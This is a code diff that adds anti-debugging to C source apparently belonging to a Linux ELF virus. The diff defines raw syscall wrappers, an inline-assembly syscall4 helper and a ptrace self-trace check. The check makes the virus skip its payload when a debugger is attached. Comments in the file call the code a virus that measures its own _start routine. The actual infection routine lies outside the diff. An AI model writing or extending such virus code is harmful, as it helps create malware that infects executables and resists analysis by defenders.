@@ -10,6 +10,7 @@
 #define SYS_CLOSE	3
 #define SYS_LSEEK	8
 #define SYS_EXIT	60
+#define SYS_PTRACE	101
 #define _exit(x) 		syscall1(SYS_EXIT, (long)(x))
 #define read(fd, buf, len) 	syscall3(SYS_READ, (long)fd, (long)(buf), (long)len)
 #define write(fd, buf, len) 	syscall3(SYS_WRITE, (long)fd, (long)(buf), (long)len)
@@ -17,6 +18,7 @@
 #define open(filename, flags, mode) 	syscall3(SYS_OPEN, \
 	       				(long)(filename), (long)flags, (long)mode)
 #define close(fd)		syscall1(SYS_CLOSE, fd)
+#define ptrace(request, pid, addr, data) syscall4(SYS_PTRACE, (long)request, (long)pid, (long)addr, (long)data)
 
 #define O_RDWR		2
 
@@ -86,6 +88,9 @@ typedef struct
 
 /* ELF format end */
 
+/* ptrace */
+#define PTRACE_ME	0
+
 static inline long syscall1(int num, long a1) __attribute__((always_inline));
 static inline long syscall1(int num, long a1) 
 {
@@ -103,6 +108,22 @@ static inline long syscall3(int num, long a1, long a2, long a3) __attribute__((a
 static inline long syscall3(int num, long a1, long a2, long a3)
 {
 	long ret;
+	__asm__ __volatile__ (
+		"syscall"
+		: "=a" (ret) /* output */
+		: "a" (num), "D" (a1), "S" (a2), "d" (a3) /* input */
+	        : /* clobered */
+	);
+	return ret;
+}
+
+static inline long syscall4(int num, long a1, long a2, long a3, long a4) __attribute__((always_inline));
+static inline long syscall4(int num, long a1, long a2, long a3, long a4)
+{
+	long ret;
+	/* really? - gcc folks.. c'mon! */
+	/* This section can be fragile in distant future... */
+	register long r10 asm("r10") = a4;
 	__asm__ __volatile__ (
 		"syscall"
 		: "=a" (ret) /* output */
@@ -150,6 +171,11 @@ void _start(void)
 	unsigned long real_code_size;
 	Elf64_Half p;
 	unsigned char jmp[27];
+
+	/* Primitive anti-debugging technique */
+	if (ptrace(PTRACE_ME, 0, 0, 0) == -1) {
+		goto label2;
+	}
 
 	/* Count size of _start function of virus */
 	real_code_size = (long)&&label2 - (long)&_start;
